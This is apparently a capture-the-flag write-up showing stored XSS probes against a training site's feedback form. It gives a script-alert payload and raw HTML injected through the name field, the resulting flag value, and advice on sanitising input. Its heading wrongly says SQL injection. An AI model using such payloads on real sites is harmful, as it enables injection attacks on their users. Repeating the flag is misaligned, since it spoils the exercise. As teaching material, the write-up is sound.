# SQL injection searchimg

## Exploitation

On the homepage, on the bottom, there is a button **Feedback**. On the page (http://192.168.1.48/?page=feedback), there is a form to write a feedback. Let's try a stored XSS

```
$ ./exploit.py '<script>alert(1);</script>'
...
   <td>
    Name : alert(1)
   </td>
...
```

With a `<script>`, the html was escaped, try with raw html

```
$ ./exploit.py '<div>coucou</div>'
...
       <td>
        Name :
        <div>
         coucou
        </div>
       </td>
...
```

Worked with raw html on the "name" input. But no flag

After some random test, it worked with the name "a". Wtf?

```
$ ./exploit.py '<div>a</div>'
...
    <center>
     <h2 style="margin-top:50px;">
      The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
     </h2>
     <br/>
     <img alt="" height="200px" src="images/win.png" width="200px"/>
    </center>
...
```

## How to fix it?

To escape the stored XSS, you have to sanitize all the input data. Like a SQL injection, never trust user data. In all languages, there is functions to do this. For exemple in php : `htmlspecialchars`

A better way is to use frameworks for your website and forms. The good framework do this job for you

## References

https://owasp.org/www-community/attacks/xss/


